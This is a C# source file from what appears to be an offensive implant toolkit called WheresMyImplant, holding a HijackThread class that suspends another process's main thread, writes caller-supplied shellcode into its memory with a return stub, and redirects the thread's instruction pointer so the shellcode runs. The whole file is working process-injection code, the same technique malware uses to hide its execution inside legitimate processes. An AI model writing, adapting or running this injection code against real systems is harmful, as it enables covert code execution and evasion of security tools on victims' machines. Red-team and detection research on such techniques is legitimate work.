using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    class HijackThread : Base, IDisposable
    {
        private UInt32 processId = 0;
        private Byte[] shellcode = null;
        private IntPtr hProcess = IntPtr.Zero;
        private IntPtr hThread = IntPtr.Zero;

        internal HijackThread(UInt32 processId, Byte[] shellcode)
        {
            this.processId = processId;
            this.shellcode = shellcode;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Main Execution Function
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            if (Process.GetCurrentProcess().Id == processId)
            {
                return;
            }

            UInt32 accessMask = (UInt32)(ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_OPERATION
                | ProcessThreadsApi.ProcessSecurityRights.PROCESS_CREATE_THREAD
                | ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_WRITE
                | ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_READ
                | ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION);
            hProcess = kernel32.OpenProcess(accessMask, false, processId);
            if (IntPtr.Zero == hProcess)
            {
                WriteOutputBad("OpenProcess Failed");
                return;
            }
            WriteOutputGood(String.Format("Recieved Process Handle: 0x{0}", hProcess.ToString("X4")));

            Int32 threadId = Process.GetProcessById((int)processId).Threads[0].Id;
            WriteOutputGood(String.Format("Main Thread ID: {0}", threadId));
            hThread = kernel32.OpenThread(
                ProcessThreadsApi.ThreadSecurityRights.THREAD_GET_CONTEXT |
                ProcessThreadsApi.ThreadSecurityRights.THREAD_SET_CONTEXT |
                ProcessThreadsApi.ThreadSecurityRights.THREAD_SUSPEND_RESUME,
                false,
                (UInt32)threadId);
            WriteOutputGood(String.Format("Recieved Thread Handle: 0x{0}", hThread.ToString("X4")));

            if (-1 == kernel32.SuspendThread(hThread))
            {
                WriteOutputBad("SuspendThread Failed");
                return;
            }
            WriteOutputNeutral("Suspended Thread");

            ////////////////////////////////////////////////////////////////////////////////
            // x64 Target Process
            ////////////////////////////////////////////////////////////////////////////////
            if (Misc.Is64BitProcess(hProcess))
            {
                Winnt.CONTEXT64 context = new Winnt.CONTEXT64();
                context.ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL;
                if (!kernel32.GetThreadContext(hThread, ref context))
                {
                    WriteOutputBad("GetThreadContext (64) Failed");
                    return;
                }
                WriteOutputNeutral("Retrieving Thread Context");
                WriteOutputNeutral(String.Format("Original RIP: 0x{0}", context.Rip.ToString("X4")));

                System.Collections.Generic.IEnumerable<Byte> stub = new Byte[] { };
                stub = stub.Concat(shellcode);
                stub = stub.Concat(new Byte[] { 0x48, 0xb8 }); // MOV RAX...
                stub = stub.Concat(BitConverter.GetBytes(context.Rip)); // ...RIP
                stub = stub.Concat(new Byte[] { 0xff, 0xe0 }); // JMP RAX

                context.Rip = (UInt64)AllocateAndWriteMemory(stub.ToArray());
                WriteOutputGood(String.Format("Updated RIP: 0x{0}", context.Rip.ToString("X4")));

                if (!kernel32.SetThreadContext(hThread, ref context))
                {
                    WriteOutputBad("SetThreadContext (64) Failed");
                    return;
                }

                if (!kernel32.GetThreadContext(hThread, ref context))
                {
                    WriteOutputBad("GetThreadContext(2) (32) Failed");
                    return;
                }
                WriteOutputNeutral(String.Format("Checking RIP: 0x{0}", context.Rip.ToString("X4")));
            }
            ////////////////////////////////////////////////////////////////////////////////
            // x86 Target Process
            ////////////////////////////////////////////////////////////////////////////////
            else
            {
                Winnt.CONTEXT context = new Winnt.CONTEXT();
                context.ContextFlags = Winnt.CONTEXT_FLAGS.CONTEXT_ALL;
                if (!kernel32.Wow64GetThreadContext(hThread, ref context))
                {
                    WriteOutputBad("GetThreadContext (32) Failed");

                    return;
                }
                WriteOutputNeutral("Retrieving Thread Context");
                WriteOutputNeutral(String.Format("Original EIP: 0x{0}", context.Eip.ToString("X4")));

                System.Collections.Generic.IEnumerable<Byte> stub = new Byte[] { };
                stub = stub.Concat(new Byte[] { 0x68 }); // PUSH...
                stub = stub.Concat(new Byte[] { BitConverter.GetBytes(context.Eip)[0] }); // ...EIP
                stub = stub.Concat(new Byte[] { 0x60, 0x9C }); // PUSHAD PUSHFD
                stub = stub.Concat(shellcode);
                stub = stub.Concat(new Byte[] { 0x9D, 0x61, 0xC3 }); // POPFD POPAD RET

                context.Eip = (UInt32)AllocateAndWriteMemory(stub.ToArray());
                WriteOutputGood(String.Format("Updated EIP: 0x{0}", context.Eip.ToString("X4")));

                if (!kernel32.Wow64SetThreadContext(hThread, ref context))
                {
                    WriteOutputBad("SetThreadContext (32) Failed");
                    return;

                }
                WriteOutputGood("Updated Thread Context");

                if (!kernel32.Wow64GetThreadContext(hThread, ref context))
                {
                    WriteOutputBad("GetThreadContext(2) (32) Failed");
                    return;
                }
                WriteOutputNeutral(String.Format("Checking EIP: 0x{0}", context.Eip.ToString("X4"))); 
            }
            WriteOutputNeutral("Resuming Thread");
            kernel32.ResumeThread(hThread);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Common code between the x64 and x84 shellcode sections
        ////////////////////////////////////////////////////////////////////////////////
        private IntPtr AllocateAndWriteMemory(Byte[] buffer)
        {
            UInt32 bufferLength = (UInt32)buffer.Length;
            
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, bufferLength, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
            if (IntPtr.Zero == lpBaseAddress)
            {
                WriteOutputBad("VirtualAllocEx Failed");
                return IntPtr.Zero;
            }
            WriteOutputGood(String.Format("Allocated {0} Bytes at 0x{1}", bufferLength, lpBaseAddress.ToString("X4")));
            WriteOutputGood(String.Format("Memory Protections Set to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE));

            UInt32 lpNumberOfBytesWritten = 0;
            kernel32.WriteProcessMemory(hProcess, lpBaseAddress, buffer, bufferLength, ref lpNumberOfBytesWritten);
            if (0 == lpNumberOfBytesWritten)
            {
                WriteOutputBad("WriteProcessMemory Failed");
                return IntPtr.Zero;
            }
            WriteOutputGood(String.Format("Wrote {0} Bytes", lpNumberOfBytesWritten));
            
            var oldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE;
            if (!kernel32.VirtualProtectEx(hProcess, lpBaseAddress, bufferLength, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref oldProtect))
            {
                WriteOutputBad("VirtualProtectEx Failed");
                return IntPtr.Zero;
            }
            WriteOutputGood(String.Format("Memory Protections Updated to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ));          

            return lpBaseAddress;
        }

        public void Dispose()
        {
            kernel32.ResumeThread(hThread);

            if (IntPtr.Zero != hProcess)
            {
                kernel32.CloseHandle(hProcess);
            }

            if (IntPtr.Zero != hThread)
            {
                kernel32.CloseHandle(hThread);
            }
        }

        ~HijackThread()
        {
            Dispose();
        }
    }
}